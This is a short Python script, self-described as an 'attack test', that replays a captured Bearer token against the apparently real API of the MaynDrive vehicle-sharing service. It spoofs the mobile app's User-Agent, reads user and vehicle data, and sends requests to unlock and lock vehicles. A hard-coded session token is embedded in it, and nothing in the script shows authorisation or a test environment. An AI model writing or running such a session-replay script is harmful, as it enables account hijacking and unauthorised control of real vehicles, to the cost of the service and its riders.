#!/usr/bin/env python3
"""
Fixed API Test Script
Tests the captured Bearer token against the CORRECT MaynDrive API endpoints
"""

import requests
import json

# Your captured Bearer token
BEARER_TOKEN = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMDM0OTMsInNlc3Npb25faWQiOiI5MzY1MTQ5Yi1lZDdkLTQ1Y2MtYTZiMi1lYTU0NmMyOWE2NGUiLCJpYXQiOjE3NTk0NDQxMDcsImV4cCI6MTc1OTQ0NzcwN30.ge09yj7PfvFgPeJsQmmfcm74YuQaU-dAgxtW21q-LHY"

HEADERS = {
    "Authorization": BEARER_TOKEN,
    "Content-Type": "application/json",
    "User-Agent": "MaynDrive/1.1.34 (Android; Mobile)",
    "Accept": "application/json"
}

def test_endpoint(url, method="GET", data=None):
    """Test an API endpoint"""
    print(f"\n🔍 Testing {method} {url}")
    
    try:
        if method == "GET":
            response = requests.get(url, headers=HEADERS, timeout=10)
        elif method == "POST":
            response = requests.post(url, headers=HEADERS, json=data, timeout=10)
        
        print(f"   Status: {response.status_code}")
        print(f"   Headers: {dict(response.headers)}")
        
        if response.text:
            try:
                json_data = response.json()
                print(f"   Response: {json.dumps(json_data, indent=2)[:500]}...")
            except:
                print(f"   Response: {response.text[:200]}...")
        
        return response.status_code == 200
        
    except Exception as e:
        print(f"   ❌ Error: {e}")
        return False

def main():
    print("🚨 MaynDrive API Attack Test (FIXED)")
    print("=" * 50)
    print("Using CORRECT API domain: api.knotcity.io")
    print("=" * 50)
    
    base_url = "https://api.knotcity.io"
    
    # Test various endpoints
    endpoints = [
        ("/api/application/user", "GET"),
        ("/api/application/vehicles", "GET"),
        ("/api/application/vehicles/nearby", "GET"),
        ("/api/application/vehicles/unlock", "POST", {"vehicle_id": "test123"}),
        ("/api/application/vehicles/freefloat/lock", "POST", {"vehicle_id": "test123"}),
    ]
    
    for endpoint in endpoints:
        url = base_url + endpoint[0]
        method = endpoint[1]
        data = endpoint[2] if len(endpoint) > 2 else None
        
        success = test_endpoint(url, method, data)
        if success:
            print("   ✅ SUCCESS")
        else:
            print("   ❌ FAILED")
    
    print("\n" + "=" * 50)
    print("🎯 Test complete!")

if __name__ == "__main__":
    main()
